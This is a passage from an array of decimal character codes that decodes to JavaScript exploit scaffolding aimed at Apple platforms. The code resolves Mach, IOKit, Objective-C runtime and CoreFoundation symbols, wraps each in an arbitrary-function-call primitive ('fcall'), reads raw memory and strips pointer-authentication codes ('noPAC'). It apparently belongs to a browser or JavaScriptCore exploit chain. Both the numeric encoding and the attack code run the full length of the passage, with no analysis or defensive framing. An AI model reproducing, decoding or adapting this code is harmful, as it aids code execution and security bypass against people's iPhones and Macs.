99, 97, 108, 108, 34, 41, 59, 10, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 86, 77, 95, 65, 76, 76, 79, 67, 65, 84, 69, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 118, 109, 95, 97, 108, 108, 111, 99, 97, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 86, 77, 95, 68, 69, 65, 76, 76, 79, 67, 65, 84, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 118, 109, 95, 100, 101, 97, 108, 108, 111, 99, 97, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 69, 82, 82, 79, 82, 95, 83, 84, 82, 73, 78, 71, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 101, 114, 114, 111, 114, 95, 115, 116, 114, 105, 110, 103, 34, 41, 59, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 80, 79, 82, 84, 95, 65, 76, 76, 79, 67, 65, 84, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 112, 111, 114, 116, 95, 97, 108, 108, 111, 99, 97, 116, 101, 34, 41, 59, 10, 10, 108, 101, 116, 32, 107, 73, 79, 77, 97, 115, 116, 101, 114, 80, 111, 114, 116, 68, 101, 102, 97, 117, 108, 116, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 107, 73, 79, 77, 97, 115, 116, 101, 114, 80, 111, 114, 116, 68, 101, 102, 97, 117, 108, 116, 34, 41, 59, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 97, 115, 115, 101, 114, 116, 40, 97, 44, 32, 98, 32, 61, 32, 34, 78, 47, 65, 34, 41, 10, 123, 10, 32, 32, 32, 32, 105, 102, 32, 40, 33, 97, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 116, 104, 114, 111, 119, 32, 110, 101, 119, 32, 69, 114, 114, 111, 114, 40, 96, 97, 115, 115, 101, 114, 116, 32, 102, 97, 105, 108, 101, 100, 58, 32, 36, 123, 98, 125, 96, 41, 10, 32, 32, 32, 32, 125, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 69, 82, 82, 79, 82, 40, 97, 41, 32, 123, 32, 116, 104, 114, 111, 119, 32, 110, 101, 119, 32, 69, 114, 114, 111, 114, 40, 97, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 110, 101, 119, 95, 117, 105, 110, 116, 54, 52, 95, 116, 40, 118, 97, 108, 32, 61, 32, 48, 110, 41, 10, 123, 10, 32, 32, 32, 32, 108, 101, 116, 32, 98, 117, 102, 32, 61, 32, 99, 97, 108, 108, 111, 99, 40, 49, 110, 44, 32, 56, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 98, 117, 102, 44, 32, 118, 97, 108, 41, 59, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 98, 117, 102, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 116, 97, 115, 107, 95, 115, 101, 108, 102, 40, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 48, 120, 50, 48, 51, 110, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 99, 97, 108, 108, 111, 99, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 65, 76, 76, 79, 67, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 108, 108, 111, 99, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 76, 76, 79, 67, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 114, 101, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 82, 69, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 101, 109, 99, 112, 121, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 69, 77, 67, 80, 89, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 101, 109, 115, 101, 116, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 69, 77, 83, 69, 84, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 108, 101, 101, 112, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 76, 69, 69, 80, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 117, 115, 108, 101, 101, 112, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 85, 83, 76, 69, 69, 80, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 99, 109, 112, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 67, 77, 80, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 99, 112, 121, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 67, 80, 89, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 110, 99, 112, 121, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 78, 67, 80, 89, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 110, 112, 114, 105, 110, 116, 102, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 78, 80, 82, 73, 78, 84, 70, 44, 32, 98, 117, 102, 44, 32, 115, 105, 122, 101, 44, 32, 102, 109, 116, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 114, 105, 110, 116, 102, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 82, 73, 78, 84, 70, 44, 32, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 102, 109, 116, 41, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 99, 108, 111, 115, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 76, 79, 83, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 101, 120, 105, 116, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 69, 88, 73, 84, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 103, 101, 116, 99, 104, 97, 114, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 71, 69, 84, 67, 72, 65, 82, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 103, 101, 116, 112, 105, 100, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 71, 69, 84, 80, 73, 68, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 121, 115, 99, 97, 108, 108, 40, 110, 117, 109, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 89, 83, 67, 65, 76, 76, 44, 32, 110, 117, 109, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 118, 109, 95, 97, 108, 108, 111, 99, 97, 116, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 86, 77, 95, 65, 76, 76, 79, 67, 65, 84, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 118, 109, 95, 100, 101, 97, 108, 108, 111, 99, 97, 116, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 86, 77, 95, 68, 69, 65, 76, 76, 79, 67, 65, 84, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 101, 114, 114, 111, 114, 95, 115, 116, 114, 105, 110, 103, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 69, 82, 82, 79, 82, 95, 83, 84, 82, 73, 78, 71, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 112, 111, 114, 116, 95, 97, 108, 108, 111, 99, 97, 116, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 80, 79, 82, 84, 95, 65, 76, 76, 79, 67, 65, 84, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 10, 108, 101, 116, 32, 103, 95, 100, 101, 118, 105, 99, 101, 95, 109, 97, 99, 104, 105, 110, 101, 32, 61, 32, 48, 110, 59, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 103, 101, 116, 95, 100, 101, 118, 105, 99, 101, 95, 109, 97, 99, 104, 105, 110, 101, 40, 41, 10, 123, 10, 32, 32, 32, 32, 105, 102, 32, 40, 103, 95, 100, 101, 118, 105, 99, 101, 95, 109, 97, 99, 104, 105, 110, 101, 32, 61, 61, 32, 48, 110, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 117, 116, 115, 110, 97, 109, 101, 32, 61, 32, 99, 97, 108, 108, 111, 99, 40, 50, 53, 54, 110, 44, 32, 53, 110, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 102, 99, 97, 108, 108, 40, 85, 78, 65, 77, 69, 44, 32, 117, 116, 115, 110, 97, 109, 101, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 103, 95, 100, 101, 118, 105, 99, 101, 95, 109, 97, 99, 104, 105, 110, 101, 32, 61, 32, 117, 116, 115, 110, 97, 109, 101, 32, 43, 32, 40, 50, 53, 54, 110, 32, 42, 32, 52, 110, 41, 59, 10, 32, 32, 32, 32, 125, 10, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 103, 95, 100, 101, 118, 105, 99, 101, 95, 109, 97, 99, 104, 105, 110, 101, 59, 10, 125, 10, 10, 108, 101, 116, 32, 79, 66, 74, 67, 95, 65, 76, 76, 79, 67, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 111, 98, 106, 99, 95, 97, 108, 108, 111, 99, 34, 41, 59, 10, 108, 101, 116, 32, 79, 66, 74, 67, 95, 65, 76, 76, 79, 67, 95, 73, 78, 73, 84, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 111, 98, 106, 99, 95, 97, 108, 108, 111, 99, 95, 105, 110, 105, 116, 34, 41, 59, 10, 108, 101, 116, 32, 79, 66, 74, 67, 95, 71, 69, 84, 67, 76, 65, 83, 83, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 111, 98, 106, 99, 95, 103, 101, 116, 67, 108, 97, 115, 115, 34, 41, 59, 10, 108, 101, 116, 32, 79, 66, 74, 67, 95, 77, 83, 71, 83, 69, 78, 68, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 34, 41, 59, 10, 108, 101, 116, 32, 83, 69, 76, 95, 82, 69, 71, 73, 83, 84, 69, 82, 78, 65, 77, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 34, 41, 59, 10, 10, 108, 101, 116, 32, 67, 70, 68, 73, 67, 84, 73, 79, 78, 65, 82, 89, 67, 82, 69, 65, 84, 69, 77, 85, 84, 65, 66, 76, 69, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 67, 70, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 67, 114, 101, 97, 116, 101, 77, 117, 116, 97, 98, 108, 101, 34, 41, 59, 10, 108, 101, 116, 32, 67, 70, 68, 73, 67, 84, 73, 79, 78, 65, 82, 89, 83, 69, 84, 86, 65, 76, 85, 69, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 67, 70, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 83, 101, 116, 86, 97, 108, 117, 101, 34, 41, 59, 10, 108, 101, 116, 32, 67, 70, 78, 85, 77, 66, 69, 82, 67, 82, 69, 65, 84, 69, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 67, 70, 78, 117, 109, 98, 101, 114, 67, 114, 101, 97, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 67, 70, 82, 69, 76, 69, 65, 83, 69, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 67, 70, 82, 101, 108, 101, 97, 115, 101, 34, 41, 59, 10, 108, 101, 116, 32, 67, 70, 83, 72, 79, 87, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 67, 70, 83, 104, 111, 119, 34, 41, 59, 10, 108, 101, 116, 32, 67, 70, 83, 84, 82, 73, 78, 71, 67, 82, 69, 65, 84, 69, 67, 79, 80, 89, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 67, 111, 112, 121, 34, 41, 59, 10, 108, 101, 116, 32, 67, 70, 83, 84, 82, 73, 78, 71, 67, 82, 69, 65, 84, 69, 87, 73, 84, 72, 67, 83, 84, 82, 73, 78, 71, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 87, 105, 116, 104, 67, 83, 116, 114, 105, 110, 103, 34, 41, 59, 10, 108, 101, 116, 32, 107, 67, 70, 65, 108, 108, 111, 99, 97, 116, 111, 114, 68, 101, 102, 97, 117, 108, 116, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 107, 67, 70, 65, 108, 108, 111, 99, 97, 116, 111, 114, 68, 101, 102, 97, 117, 108, 116, 34, 41, 46, 110, 111, 80, 65, 67, 40, 41, 41, 59, 10, 108, 101, 116, 32, 107, 67, 70, 83, 116, 114, 105, 110, 103, 69, 110, 99, 111, 100, 105, 110, 103, 85, 84, 70, 56, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 48, 120, 48, 56, 48, 48, 48, 49, 48, 48, 110, 59, 10, 108, 101, 116, 32, 107, 67, 70, 84, 121, 112, 101, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 75, 101, 121, 67, 97, 108, 108, 66, 97, 99, 107, 115, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 107, 67, 70, 84, 121, 112, 101, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 75, 101, 121, 67, 97, 108, 108, 66, 97, 99, 107, 115, 34, 41, 46, 110, 111, 80, 65, 67, 40, 41, 59, 10, 108, 101, 116, 32, 107, 67, 70, 84, 121, 112, 101, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 86, 97, 108, 117, 101, 67, 97, 108, 108, 66, 97, 99, 107, 115, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 107, 67, 70, 84, 121, 112, 101, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 86, 97, 108, 117, 101, 67, 97, 108, 108, 66, 97, 99, 107, 115, 34, 41, 46, 110, 111, 80, 65, 67, 40, 41, 59, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 67, 114, 101, 97, 116, 101, 77, 117, 116, 97, 98, 108, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 68, 73, 67, 84, 73, 79, 78, 65, 82, 89, 67, 82, 69, 65, 84, 69, 77, 85, 84, 65, 66, 76, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 83, 101, 116, 86, 97, 108, 117, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 68, 73, 67, 84, 73, 79, 78, 65, 82, 89, 83, 69, 84, 86, 65, 76, 85, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 78, 117, 109, 98, 101, 114, 67, 114, 101, 97, 116, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 78, 85, 77, 66, 69, 82, 67, 82, 69, 65, 84, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 82, 101, 108, 101, 97, 115, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 82, 69, 76, 69, 65, 83, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 83, 104, 111, 119, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 83, 72, 79, 87, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 67, 111, 112, 121, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 83, 84, 82, 73, 78, 71, 67, 82, 69, 65, 84, 69, 67, 79, 80, 89, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 87, 105, 116, 104, 67, 83, 116, 114, 105, 110, 103, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 83, 84, 82, 73, 78, 71, 67, 82, 69, 65, 84, 69, 87, 73, 84, 72, 67, 83, 84, 82, 73, 78, 71, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 98, 106, 99, 95, 97, 108, 108, 111, 99, 40, 99, 108, 97, 115, 115, 95, 111, 98, 106, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 79, 66, 74, 67, 95, 65, 76, 76, 79, 67, 44, 32, 99, 108, 97, 115, 115, 95, 111, 98, 106, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 98, 106, 99, 95, 97, 108, 108, 111, 99, 95, 105, 110, 105, 116, 40, 99, 108, 97, 115, 115, 95, 111, 98, 106, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 79, 66, 74, 67, 95, 65, 76, 76, 79, 67, 95, 73, 78, 73, 84, 44, 32, 99, 108, 97, 115, 115, 95, 111, 98, 106, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 98, 106, 99, 95, 103, 101, 116, 67, 108, 97, 115, 115, 40, 99, 108, 97, 115, 115, 95, 110, 97, 109, 101, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 79, 66, 74, 67, 95, 71, 69, 84, 67, 76, 65, 83, 83, 44, 32, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 99, 108, 97, 115, 115, 95, 110, 97, 109, 101, 41, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 79, 66, 74, 67, 95, 77, 83, 71, 83, 69, 78, 68, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 99, 115, 116, 114, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 69, 76, 95, 82, 69, 71, 73, 83, 84, 69, 82, 78, 65, 77, 69, 44, 32, 99, 115, 116, 114, 41, 59, 32, 125, 10, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 58, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 110, 105, 116, 87, 105, 116, 104, 84, 97, 114, 103, 101, 116, 95, 115, 101, 108, 101, 99, 116, 111, 114, 95, 111, 98, 106, 101, 99, 116, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 105, 110, 105, 116, 87, 105, 116, 104, 84, 97, 114, 103, 101, 116, 58, 115, 101, 108, 101, 99, 116, 111, 114, 58, 111, 98, 106, 101, 99, 116, 58, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 87, 105, 116, 104, 77, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 87, 105, 116, 104, 77, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 58, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 110, 118, 111, 107, 101, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 105, 110, 118, 111, 107, 101, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 115, 70, 105, 110, 105, 115, 104, 101, 100, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 105, 115, 70, 105, 110, 105, 115, 104, 101, 100, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 109, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 70, 111, 114, 83, 101, 108, 101, 99, 116, 111, 114, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 109, 101, 116, 104, 111, 100, 83, 105, 